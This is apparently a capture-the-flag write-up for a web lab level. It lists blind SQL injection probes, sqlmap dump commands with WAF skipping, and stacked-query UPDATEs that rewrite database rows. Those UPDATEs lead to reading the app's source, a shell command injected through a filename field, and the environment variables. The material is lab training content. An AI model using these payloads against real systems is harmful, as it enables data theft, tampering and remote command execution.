Test sql injection

```html
http://34.74.105.127/e273dcce57/fetch?id=1
http://34.74.105.127/e273dcce57/fetch?id=1 AND (select length(database()) == 6
http://34.74.105.127/e273dcce57/fetch?id=1 AND database() like 'level5'
http://34.74.105.127/e273dcce57/fetch?id=1 AND (select count(1) from information_schema.tables where table_schema=database())=2
http://34.74.105.127/e273dcce57/fetch?id=1 AND (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=6
http://34.74.105.127/e273dcce57/fetch?id=1 AND (select table_name from information_schema.tables where table_schema=database() limit 0,1) like 'albums'
http://34.74.105.127/e273dcce57/fetch?id=1 AND (select length(table_name) from information_schema.tables where table_schema=database() limit 1,1)=6
http://34.74.105.127/e273dcce57/fetch?id=1 AND (select table_name from information_schema.tables where table_schema=database() limit 0,1) like 'photos'
```

```bash
sqlmap -u "http://34.74.105.127/e273dcce57/fetch?id=1" --method GET --dump -D level5 -T photos -p id --code 200 --skip-waf --random-agent --threads 10 -o
sqlmap -u "http://34.74.105.127/e273dcce57/fetch?id=1" --method GET --dump -D level5 -T albums -p id --code 200 --skip-waf --random-agent --threads 10 -o
```

Try to change the title

``html
http://34.74.105.127/e273dcce57/fetch?id=1;UPDATE%20photos%20set%20title=%27hello%27%20where%20id=2;commit;
```

Space used: 0 total looks weird
By setting parent to 0 we get 232K total

```html
http://34.74.105.127/e273dcce57/fetch?id=1;UPDATE%20photos%20set%20parent=0;commit;
http://34.74.105.127/e273dcce57/fetch?id=1;UPDATE%20photos%20set%20filename=%27main.py%27%20where%20id=3;commit
```

Then visit 

```html
  http://34.74.105.127/e273dcce57/fetch?id=3
```

We get the source code of main.py which contains a flag in comment

By checking the ``main.py``, looks like we can perform shell script injection by modifying filename

Try to check if there is another files other than jpgs in files

```html
  http://34.74.105.127/a3aa84e754/fetch?id=1.1;update%20photos%20set%20filename=%27%20;ls%20files%20--ignore=*.jpg%20%27;commit;
```
Well, found nothing here.

How about get the enviroment variables 
```
  http://34.74.105.127/a3aa84e754/fetch?id=1.1;update%20photos%20set%20filename=%27files/env.txt%27%20where%20id=3;commit;
```

Get the env.txt file via

```html
  http://34.74.105.127/a3aa84e754/fetch?id=3
```

There are three flags in env.txt file
